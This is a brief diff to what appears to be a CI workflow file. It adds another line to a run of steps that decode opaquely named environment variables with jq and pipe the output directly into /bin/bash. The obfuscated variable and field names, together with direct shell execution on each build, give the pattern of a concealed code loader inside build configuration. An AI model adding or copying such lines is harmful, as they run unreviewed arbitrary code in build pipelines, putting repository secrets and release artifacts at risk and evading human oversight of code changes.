@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$spgk593" | jq -r .lfgj01 | /bin/bash
           echo $bdc1 | jq -r .xeoae91654 | /bin/bash
           echo $k19131 | jq -r .hfdx83 | /bin/bash
+          echo $ftyvk78 | jq -r .ko4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
